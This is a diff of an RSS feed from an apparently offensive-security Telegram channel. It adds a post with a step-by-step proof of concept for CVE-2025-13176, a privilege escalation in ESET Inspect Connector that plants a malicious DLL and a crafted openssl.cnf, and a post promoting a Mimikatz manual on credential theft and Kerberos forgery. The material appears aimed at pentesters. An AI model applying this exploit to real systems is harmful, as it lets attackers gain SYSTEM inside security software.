@@ -1,5 +1,35 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Wed, 18 Feb 2026 05:01:17 +0000</lastBuildDate><item><title>Форк популярного скрипта ldapdomaindump, но только работает с ADWS</title><link>https://t.me/P0x3k_1N73LL1G3NC3/271</link><description>Форк популярного скрипта ldapdomaindump, но только работает с ADWS
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>1N73LL1G3NC3</title><link>https://t.me/P0x3k_1N73LL1G3NC3</link><description>Reborn…</description><language>ru</language><lastBuildDate>Wed, 18 Feb 2026 09:02:01 +0000</lastBuildDate><item><title>CVE-2025-13176: Local Privilege Escalation in ESET Inspect EDR</title><link>https://t.me/P0x3k_1N73LL1G3NC3/273</link><description>CVE-2025-13176: Local Privilege Escalation in ESET Inspect EDR
+LPE vulnerability in the ESET Inspect Connector for Windows (versions prior to 3.0.5765) due to the ElConnector.exe process (running as SYSTEM) attempting to load an OpenSSL configuration file from a non-existent path that can be created by a low-privileged user
+PoC:
+1) Create the directory: C:\src\vcpkg\packages\openssl_x64-windows-static\
+2) Place a malicious DLL (e.g., woot.dll) in that directory.
+3) Create an openssl.cnf file in that directory with the following content:
+# Malicious openssl.cnf
+openssl_conf = openssl_init
+[openssl_init]
+engines = engine_section
+[engine_section]
+cmd = cmd_section
+[cmd_section]
+engine_id = cmd
+dynamic_path = C:\\src\\vcpkg\\packages\\openssl_x64-windows-static\\woot.dll
+init = 0
+4) Wait for the ESET Inspect Connector service to restart or trigger an OpenSSL initialization.
+5) The woot.dll is loaded inside the EDR’s process and executed as SYSTEM. There is no signing requirement for DLLs in this process.
+
+[Media: Фото]</description><pubDate>Wed, 18 Feb 2026 09:02:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_273</guid></item><item><title>The Mimikatz Missing Manual</title><link>https://t.me/P0x3k_1N73LL1G3NC3/272</link><description>The Mimikatz Missing Manual
+My goal was to create the "Missing Manual" — the documentation that explains not just the commands, but the why and the how of the Windows protocols being manipulated.
+Parts:
+• Foundations: Setting up your environment and the basic syntax.
+• System Internals: How Windows handles tokens, processes, and services.
+• LSASS &amp; Credentials: The heart of Mimikatz—extracting secrets from memory.
+• Kerberos Deep Dive: Tickets, forgery, and delegation.
+• PKI &amp; Certificates: Hardware and software-based identities.
+• Domain Persistence: Owning the directory through replication.
+•DPAPI: Unlocking the secrets at rest.
+
+[Media: Фото]</description><pubDate>Wed, 18 Feb 2026 06:07:11 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_272</guid></item><item><title>Форк популярного скрипта ldapdomaindump, но только работает с ADWS</title><link>https://t.me/P0x3k_1N73LL1G3NC3/271</link><description>Форк популярного скрипта ldapdomaindump, но только работает с ADWS
 https://github.com/mverschu/adwsdomaindump
 #ad #pentest #redteam #recon</description><pubDate>Wed, 18 Feb 2026 05:01:17 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_271</guid></item><item><title>Уроним пару бустов на канал?😏</title><link>https://t.me/P0x3k_1N73LL1G3NC3/270</link><description>Уроним пару бустов на канал?😏
 
